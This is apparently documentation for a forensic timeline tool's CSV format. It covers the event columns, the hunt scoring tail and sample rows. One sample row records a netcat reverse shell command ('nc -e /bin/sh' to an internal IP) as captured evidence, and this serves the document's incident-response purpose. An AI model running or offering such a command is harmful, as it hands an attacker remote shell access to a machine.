# The CSV

[← README](../README.md)

CAAREA writes one RFC 4180 CSV with fifteen columns: ten that describe the event, written by the parsers, and an analysis tail of five that the parsers leave empty and that `--hunt` and the analyst fill. The tail is the one that closes the timelines of [masstin](https://github.com/jupyterj0nes/masstin), faramir and allymacb (`hunt`, `hunt_score`, `hunt_why`, `verdict`, `notes`), with the same words and the same scale in the four tools (masstin's [`docs/csv-format.md`](https://github.com/jupyterj0nes/masstin/blob/main/docs/csv-format.md), *The same tail in caarea, faramir and allymacb*, is the reference), so a case tool maps it once.

Timestamps are UTC with a fixed width (`YYYY-MM-DDTHH:MM:SS.ffffffZ`), so sorting the text sorts the time. Rows that are identical in every column (two records with the same time, user, process and command line) are collapsed into one. The CSV has no "source file" column by design; run with `-m` or per package when you need that separation.

## The ten event columns

| Column | Meaning |
| :--- | :--- |
| `timestamp` | When it happened, UTC |
| `computer` | Host name (from the event, the SYSTEM hive, the UAC hostname file or the package name) |
| `artifact` | Where the row comes from: `evtx:4688`, `evtx:sysmon:1`, `registry:bam`, `prefetch`, `linux:audit:execve`, ... Rows that were not read from the live evidence carry an extra segment and the detail in brackets: `evtx:4688:vss [2026-09-04T08:12:53Z]` (only in that shadow copy), `registry:bam:deleted` (recovered from a freed hive cell), `evtx:4688:carved [@0x1c3f80000]` (carved from raw bytes at that offset) |
| `event_id` | Windows event id, 0 otherwise |
| `pid` | Process id when the source has one (for 4688 it is the *new* process) |
| `subject_username` | Who ran it |
| `target_username` | Who it ran as, when different (`sudo`, `su`, services) |
| `processname` | Binary, script, task or package |
| `commandline` | Full command line or the details of the artifact |
| `parentprocessname` | Parent process or launching component. When the source only gave a PID (auditd, `pacct`, 4688 before Windows 10) and the creator's own row is in the timeline, the name is filled in as `/usr/bin/sudo (PID: 12493)` |

## The analysis tail

| Column | Meaning |
| :--- | :--- |
| `hunt` | What the hunt made of the row, one of masstin's six values: `significant` (a high rule fired, or a statistical test with q ≤ alpha), `candidate` (a medium rule, or a low rule on a row no test judged, or a test above alpha), `habitual` (a clean reference host executes the same thing; also the statistical tests' word), `not_evaluated` and `baseline` (the statistical tests' words, from phase H4), or empty: nothing judged the row. When a rule and a test both speak, the stronger state wins; a low rule never lowers a test's state. A rule measured common (fewer than 10 points: it fires on more than one clean row in ten) is noise on that kind of row and gives neither state nor points, only its clause. `suspicious` is the analyst's word and lives in `verdict` |
| `hunt_score` | How rare the row is, an integer from 0 to 100 on masstin's scale, `-10 · log10` of a probability: 13 is one in twenty, 30 one in a thousand, 60 one in a million. A statistical test contributes `-10 · log10(q)`; a rule contributes the rarity of its pattern **measured** on stock, clean reference timelines (how often it fires there; a pattern that never fired gets the bound the corpus gives, see [How `hunt_score` is measured](hunting.md#how-hunt_score-is-measured)). Contributions add, capped at 100. A rule not measured yet adds 0 and says so in `hunt_why`. The rule's catalogue score never goes here; it stays in the findings table. Empty when nothing judged the row |
| `hunt_why` | Why, in words, naming the source: a rule's clause starts with `rule <ID> (<level>):`, a test's clause is in words without the prefix; the strongest first, separated by `; `, the lineage last. `rule GEN-OFFICE-SHELL (high): winword.exe launched cmd.exe [T1566.001]; rule GEN-PARENT-GONE (low): creator had exited [T1134.004]; lineage: explorer.exe > WINWORD.EXE > cmd.exe`. Filter on `rule ` to keep the rules, on its absence to keep the statistics |
| `verdict` | The analyst's: `suspicious`, `confirmed`, `benign`, or empty. Never written by CAAREA |
| `notes` | The analyst's free text |

Two real rows (the empty tail is written bare, `,,,,,`, as masstin writes it):

```csv
"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,3744,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","",,,,,
"2025-09-26T00:01:40.243000Z","victim01","linux:audit:execve",0,3538,"1000","1000","/usr/bin/nc","nc -e /bin/sh 10.0.0.5 (CWD: /tmp)","PID: 2686",,,,,
```

The same first row after `caarea --hunt` (the ten event columns do not change a byte; only the tail is filled):

```csv
"2016-09-21T03:41:02.560546Z","IE10Win7","evtx:4688",4688,3744,"WORKGROUP\IE10WIN7$","","C:\Windows\duKhLYUX.exe","C:\Windows\duKhLYUX.exe","","candidate",72,"rule PATH-WINDOWS-ROOT (medium): duKhLYUX.exe ran from the root of C:\Windows [T1036.005]; rule NAM-RANDOM (low): duKhLYUX.exe has a generated-looking name (random letters) [T1036]; lineage: duKhLYUX.exe",,
```

## Reading it

- **Timeline Explorer** (Eric Zimmerman) opens it as is; filter `hunt` for `significant` and `candidate`, sort `hunt_score` descending.
- **PowerShell**: `Import-Csv timeline.csv | ? hunt | sort {[int]$_.hunt_score} -Desc | ft hunt,hunt_score,timestamp,processname`.
- **masstin's viewer** and any case tool that already reads masstin's tail reads CAAREA's unchanged.
- Two CSVs from two hosts can be concatenated (drop the second header) and sorted by the first column: the fixed-width UTC timestamps keep them in order.
